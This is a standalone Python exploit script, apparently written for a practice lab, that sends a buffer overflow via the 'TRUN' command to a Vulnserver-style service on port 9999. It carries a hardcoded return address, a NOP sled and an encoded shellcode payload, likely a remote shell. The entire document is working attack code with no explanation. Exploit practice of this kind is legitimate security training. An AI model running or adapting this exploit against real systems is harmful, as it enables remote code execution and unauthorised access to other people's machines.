#!/usr/bin/python

import socket
import sys

ip = '10.10.166.108'
port = 9999

buffer = 'TRUN /.:/'
buffer += 'A'*2003
buffer += '\xaf\x11\x50\x62' #0x625011AF
buffer += '\x90' * 16

buf =  b""
buf += b"\xb8\xc5\xed\x67\xaf\xda\xd2\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x45\x12\x83\xed\xfc\x03\x80\xe3\x85"
buf += b"\x5a\xf6\x14\xcb\xa5\x06\xe5\xac\x2c\xe3\xd4\xec\x4b"
buf += b"\x60\x46\xdd\x18\x24\x6b\x96\x4d\xdc\xf8\xda\x59\xd3"
buf += b"\x49\x50\xbc\xda\x4a\xc9\xfc\x7d\xc9\x10\xd1\x5d\xf0"
buf += b"\xda\x24\x9c\x35\x06\xc4\xcc\xee\x4c\x7b\xe0\x9b\x19"
buf += b"\x40\x8b\xd0\x8c\xc0\x68\xa0\xaf\xe1\x3f\xba\xe9\x21"
buf += b"\xbe\x6f\x82\x6b\xd8\x6c\xaf\x22\x53\x46\x5b\xb5\xb5"
buf += b"\x96\xa4\x1a\xf8\x16\x57\x62\x3d\x90\x88\x11\x37\xe2"
buf += b"\x35\x22\x8c\x98\xe1\xa7\x16\x3a\x61\x1f\xf2\xba\xa6"
buf += b"\xc6\x71\xb0\x03\x8c\xdd\xd5\x92\x41\x56\xe1\x1f\x64"
buf += b"\xb8\x63\x5b\x43\x1c\x2f\x3f\xea\x05\x95\xee\x13\x55"
buf += b"\x76\x4e\xb6\x1e\x9b\x9b\xcb\x7d\xf4\x68\xe6\x7d\x04"
buf += b"\xe7\x71\x0e\x36\xa8\x29\x98\x7a\x21\xf4\x5f\x7c\x18"
buf += b"\x40\xcf\x83\xa3\xb1\xc6\x47\xf7\xe1\x70\x61\x78\x6a"
buf += b"\x80\x8e\xad\x3d\xd0\x20\x1e\xfe\x80\x80\xce\x96\xca"
buf += b"\x0e\x30\x86\xf5\xc4\x59\x2d\x0c\x8f\x6f\xba\x0f\xf4"
buf += b"\x18\xb8\x0f\x1b\x18\x35\xe9\x71\x8a\x10\xa2\xed\x33"
buf += b"\x39\x38\x8f\xbc\x97\x45\x8f\x37\x14\xba\x5e\xb0\x51"
buf += b"\xa8\x37\x30\x2c\x92\x9e\x4f\x9a\xba\x7d\xdd\x41\x3a"
buf += b"\x0b\xfe\xdd\x6d\x5c\x30\x14\xfb\x70\x6b\x8e\x19\x89"
buf += b"\xed\xe9\x99\x56\xce\xf4\x20\x1a\x6a\xd3\x32\xe2\x73"
buf += b"\x5f\x66\xba\x25\x09\xd0\x7c\x9c\xfb\x8a\xd6\x73\x52"
buf += b"\x5a\xae\xbf\x65\x1c\xaf\x95\x13\xc0\x1e\x40\x62\xff"
buf += b"\xaf\x04\x62\x78\xd2\xb4\x8d\x53\x56\xc4\xc7\xf9\xff"
buf += b"\x4d\x8e\x68\x42\x10\x31\x47\x81\x2d\xb2\x6d\x7a\xca"
buf += b"\xaa\x04\x7f\x96\x6c\xf5\x0d\x87\x18\xf9\xa2\xa8\x08"

#newline = '\r\n'

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        data = bytes(buffer, 'latin-1')
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending buffer')
        s.send(data + buf)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
